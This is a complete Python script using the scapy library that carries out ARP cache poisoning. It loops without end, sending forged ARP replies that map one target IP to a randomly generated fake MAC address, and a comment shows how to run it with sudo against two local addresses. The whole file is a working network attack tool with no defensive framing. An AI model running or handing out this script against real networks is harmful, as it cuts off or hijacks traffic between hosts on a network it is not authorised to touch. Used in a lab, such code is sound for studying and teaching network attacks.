from scapy.all import send
from scapy.layers.l2 import ARP
import sys
import random


def arpPoison(tip,sip,smac):
    packet = ARP(op=2,pdst=tip, psrc=sip, hwsrc=smac)
    send(packet,verbose=False)


def main():
    try:
        target1_ip = sys.argv[1]
        target2_ip = sys.argv[2]
    except IndexError:
        print("Enter Proper Arguments!")
        sys.exit(0)
    fake_MAC = ":".join(map(lambda hx:format(hx,'x'),(random.randint(0, 255) for _ in range(6))))
    print(fake_MAC)
    print("Starting ARP cache Poisoning")
    try:
        while True:
            arpPoison(target2_ip, target1_ip, fake_MAC)
    except KeyboardInterrupt:
        print("\nStopping ARP Cache Poisoning")


#RUN AS : sudo python3 arm_poison.py 192.168.1.2 192.168.1.3
if __name__ == '__main__':
    try:
        main()
    except PermissionError:
        print("\nRun as sudo \n")
        sys.exit(0)

